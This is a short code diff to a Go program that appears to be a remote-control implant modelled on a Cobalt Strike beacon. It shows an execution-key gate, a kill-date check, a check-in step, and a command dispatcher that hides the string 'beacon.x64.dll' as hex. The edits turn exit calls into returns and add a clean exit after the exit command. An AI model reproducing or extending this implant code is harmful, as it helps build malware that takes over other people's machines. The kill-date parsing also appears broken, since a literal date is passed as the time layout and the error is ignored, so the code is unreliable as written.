@@ -17,17 +17,17 @@ import (
 func main() {
 	if config.ExecuteKey != "" {
 		if len(os.Args) != 2 {
-			os.Exit(0)
+			return
 		}
 		if os.Args[1] != config.ExecuteKey {
-			os.Exit(0)
+			return
 		}
 	}
 
 	if config.ExecuteTime != "" {
 		t, _ := time.Parse("2021-01-01 12:00:05", config.ExecuteTime)
 		if time.Now().UTC().Unix() > t.Unix() {
-			os.Exit(0)
+			return
 		}
 	}
 
@@ -47,7 +47,7 @@ func main() {
 	if errFirstBlood != nil {
 		fmt.Println(errFirstBlood)
 		time.Sleep(3 * time.Second)
-		os.Exit(0)
+		return
 	}
 
 	errInit := services.Init()
@@ -126,6 +126,9 @@ func main() {
 							callbackType = 19
 						case packet.CMD_TYPE_EXIT:
 							result, err = services.CmdExit()
+							if err == nil {
+								return
+							}
 							callbackType = 0
 						case packet.CMD_TYPE_SPAWN_X64:
 							bx64, _ := hex.DecodeString("626561636f6e2e7836342e646c6c") //beacon.x64.dll
